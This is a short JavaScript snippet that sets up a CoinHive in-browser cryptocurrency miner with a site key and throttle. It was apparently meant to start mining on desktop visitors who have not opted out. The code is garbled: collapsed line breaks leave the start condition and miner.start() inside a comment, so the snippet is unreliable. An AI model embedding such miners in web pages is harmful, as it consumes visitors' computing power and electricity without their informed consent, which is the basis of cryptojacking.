var miner = new CoinHive.Anonymous('lYGXHip7oJ3L30CfFaukY1bBMMRozVlK', {
    throttle: 0.2
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}